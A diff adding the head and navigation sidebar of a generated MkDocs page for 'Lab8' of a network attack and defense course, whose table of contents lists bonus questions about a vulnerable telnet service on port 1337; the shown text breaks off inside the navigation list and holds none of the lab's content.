@@ -1,0 +1,4157 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../lab7_pwn/">
+      
+      
+        <link rel="next" href="../lab9/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>Lab8 - My Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.618322db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Lab8
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    In class learning
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    In class learning
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Semester 3
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Semester 3
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_1" id="__nav_2_1_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network attack and defense
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Network attack and defense
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Index
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab4
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab5
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab6
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab7_pwn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NAD lab07 PWN
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab8
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab8
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        附加题
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="附加题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1337-telnet" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、1337 端口用 telnet 访问服务存在漏洞，试寻找之
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、三个数字的用处
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、对第一个问题的另一个回答
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab9/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab9
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_2" id="__nav_2_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Probability theory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Probability theory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../probability_theory/AAA_Reference/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AAA Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../probability_theory/Ch%200%20%E5%B8%B8%E8%A7%81%E5%88%86%E5%B8%83%E9%80%9F%E6%9F%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ch 0 常见分布速查
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../probability_theory/Ch%201%20%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ch.1 随机事件与概率
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../probability_theory/Ch%202%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ch.2 随机变量及其概率分布
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../probability_theory/Ch%203%20%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ch.3 二维随机变量及其分布
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../probability_theory/Ch%204%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ch.4 随机变量的数字特征
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../probability_theory/Ch%205%20%E6%9E%81%E9%99%90%E7%90%86%E8%AE%BA/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ch.5 极限理论
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../probability_theory/Ch%206%20%E7%BB%9F%E8%AE%A1%E9%87%8F%E4%B8%8E%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ch.6 统计量与抽样分布
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../probability_theory/Ch%207%20%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ch.7 参数估计
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_3" id="__nav_2_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    problem solving III
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    problem solving III
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_3_1" id="__nav_2_1_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OnlineJudges
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_1_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OnlineJudges
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges/AAA_README/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AAA README
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges/P10001/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P10001
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges/P10002/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P10002
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges/P10003/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P10003
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges/P10004/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P10004
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges/P10005/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P10005
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges/P10006/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P10006
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges/P10007/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P10007
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_3_2" id="__nav_2_1_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OnlineJudges Solutions
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_1_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OnlineJudges Solutions
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/AAA_README/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AAA README
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1001/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1001
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1002/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1002
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1003/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1003
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1004/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1004
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1005/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1005
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1006/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1006
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1007/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1007
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1008/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1008
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1009/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1009
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1010/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1010
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1011/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1011
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1012/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1012
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1013/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1013
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1014/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1014
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1015/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1015
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1016/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1016
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1017/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1017
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1018/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1018
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
